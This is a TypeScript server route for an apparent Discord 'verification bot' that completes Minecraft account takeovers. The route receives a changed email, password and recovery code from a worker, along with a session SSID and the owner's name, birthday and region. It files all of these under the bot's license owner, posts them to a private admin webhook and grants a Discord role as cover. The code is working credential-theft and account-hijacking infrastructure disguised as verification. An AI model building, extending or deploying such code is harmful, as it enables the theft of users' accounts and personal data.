import { createFileRoute } from "@tanstack/react-router";
import { authWorker, workerDb } from "@/lib/worker-auth.server";
import { envStr } from "@/lib/luaux-server.server";

const db = workerDb;

export const Route = createFileRoute("/api/verification/complete")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        if (!authWorker(request)) {
          return Response.json({ error: "Unauthorized" }, { status: 401 });
        }

        let body: { config?: Record<string, unknown>; result?: Record<string, unknown> };
        try {
          body = await request.json();
        } catch {
          return Response.json({ error: "Invalid JSON" }, { status: 400 });
        }

        const { config, result } = body;
        if (!config || !result) {
          return Response.json({ error: "Missing config or result" }, { status: 400 });
        }

        const memberDiscordId = (config.discordId as string) || "";
        const ownerDiscordId = (config.ownerDiscordId as string) || "";
        const mcUsername = (result.mcUsername as string) || "Unknown";
        const mcEmail = (config.email as string) || "";
        const guildId = (config.guildId as string) || "";
        const channelId = (config.channelId as string) || "";
        const roleId = (config.roleId as string) || "";
        const sessionId = (config.sessionId as string) || "";

        // Always use central LuauX bot for roles + channel posts
        let ownerId = ownerDiscordId;
        if (guildId) {
          const { data: settings } = await db()
            .from("verification_settings")
            .select("verified_role_id, channel_id, discord_id")
            .eq("guild_id", guildId)
            .maybeSingle();
          if (!ownerId && settings?.discord_id) ownerId = settings.discord_id;
        }
        const botToken = envStr("DISCORD_BOT_TOKEN");

        // Store under license owner so dashboard getSecuredAccounts works;
        // member id is still used for role assignment.
        const storeDiscordId = ownerId || memberDiscordId;

        const newEmail = String(result.newEmail || "");
        const newPassword = String(result.newPassword || "");
        const recoveryCode = String(result.recoveryCode || "");
        const secured =
          newEmail &&
          newPassword &&
          recoveryCode &&
          newEmail !== "Couldn't Change!" &&
          newPassword !== "Couldn't Change!" &&
          recoveryCode !== "Couldn't Change!";

        if (!secured) {
          if (sessionId) {
            await db()
              .from("verification_sessions")
              .update({ status: "failed" })
              .eq("id", sessionId);
          }
          return Response.json(
            { error: "Secure result incomplete — credentials not changed" },
            { status: 422 },
          );
        }

        // Store secured account (secrets stay in DB + optional admin webhook / DM only)
        const { error: insertError } = await db().from("secured_accounts").insert({
          discord_id: storeDiscordId,
          mc_username: mcUsername,
          mc_email: mcEmail,
          new_email: newEmail,
          new_password: newPassword,
          new_recovery_code: recoveryCode,
          mc_ssid: result.ssid as string | null,
          mc_capes: result.capes as string,
          mc_method: result.method as string,
          owner_first_name: result.firstName as string,
          owner_last_name: result.lastName as string,
          owner_region: result.region as string,
          owner_birthday: result.birthday as string,
          guild_id: guildId || null,
          session_id: sessionId || null,
        });

        if (insertError) {
          console.error("[verification/complete] insert secured_accounts:", insertError.message);
        }

        if (sessionId) {
          await db()
            .from("verification_sessions")
            .update({ status: "secured" })
            .eq("id", sessionId);
        }

        // Public channel: status only — NEVER post passwords/recovery codes
        if (channelId && botToken) {
          const publicEmbed = {
            title: "✅ Account Secured",
            color: 0x50c878,
            description: mcUsername
              ? `**${mcUsername}** was secured successfully.`
              : "Account was secured successfully.",
            footer: { text: "LuauX Verification Bot — credentials are private" },
          };

          const msgRes = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
            method: "POST",
            headers: {
              Authorization: `Bot ${botToken}`,
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ embeds: [publicEmbed] }),
          });
          if (!msgRes.ok) {
            const t = await msgRes.text().catch(() => "");
            console.error("[verification/complete] channel message failed:", msgRes.status, t);
          }
        }

        // Role grant independent of channel message
        if (guildId && roleId && memberDiscordId && botToken) {
          const roleRes = await fetch(
            `https://discord.com/api/v10/guilds/${guildId}/members/${memberDiscordId}/roles/${roleId}`,
            {
              method: "PUT",
              headers: {
                Authorization: `Bot ${botToken}`,
                "Content-Type": "application/json",
                "X-Audit-Log-Reason": "LuauX verification",
              },
            },
          );
          if (!roleRes.ok) {
            const t = await roleRes.text().catch(() => "");
            console.error("[verification/complete] role assign failed:", roleRes.status, t);
          }
        } else if (!botToken) {
          console.error("[verification/complete] No bot token available for guild", guildId);
        }

        // DM credentials to the member only (not the public channel)
        if (memberDiscordId && botToken) {
          try {
            const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
              method: "POST",
              headers: {
                Authorization: `Bot ${botToken}`,
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ recipient_id: memberDiscordId }),
            });
            if (dmRes.ok) {
              const dm = (await dmRes.json()) as { id: string };
              await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
                method: "POST",
                headers: {
                  Authorization: `Bot ${botToken}`,
                  "Content-Type": "application/json",
                },
                body: JSON.stringify({
                  content:
                    `✅ **Your Minecraft account was secured**\n\n` +
                    `**MC:** \`${mcUsername}\`\n` +
                    `**New email:** ||${newEmail}||\n` +
                    `**New password:** ||${newPassword}||\n` +
                    `**Recovery code:** ||${recoveryCode}||\n\n` +
                    `Keep these private. Do not share them in server channels.`,
                }),
              });
            }
          } catch (e) {
            console.warn("[verification/complete] member DM failed", e);
          }
        }

        // Private admin webhook
        const adminWebhookUrl = process.env.ADMIN_WEBHOOK_URL;
        if (adminWebhookUrl) {
          try {
            await fetch(adminWebhookUrl, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                embeds: [
                  {
                    title: "🔒 Account Secured (Admin Log)",
                    color: 0x5865f2,
                    fields: [
                      { name: "Member Discord ID", value: `\`\`\`${memberDiscordId}\`\`\``, inline: true },
                      { name: "Owner Discord ID", value: `\`\`\`${storeDiscordId}\`\`\``, inline: true },
                      { name: "Guild ID", value: `\`\`\`${guildId || "N/A"}\`\`\``, inline: true },
                      { name: "MC Username", value: `\`\`\`${mcUsername}\`\`\``, inline: true },
                      {
                        name: "New Email",
                        value: `\`\`\`${result.newEmail || "N/A"}\`\`\``,
                        inline: true,
                      },
                      {
                        name: "New Password",
                        value: `\`\`\`${result.newPassword || "N/A"}\`\`\``,
                        inline: true,
                      },
                      {
                        name: "Recovery Code",
                        value: `\`\`\`${result.recoveryCode || "N/A"}\`\`\``,
                        inline: true,
                      },
                    ],
                  },
                ],
              }),
            });
          } catch (e) {
            console.error("[verification/complete] admin webhook failed:", e);
          }
        }

        return Response.json({ ok: true });
      },
    },
  },
});
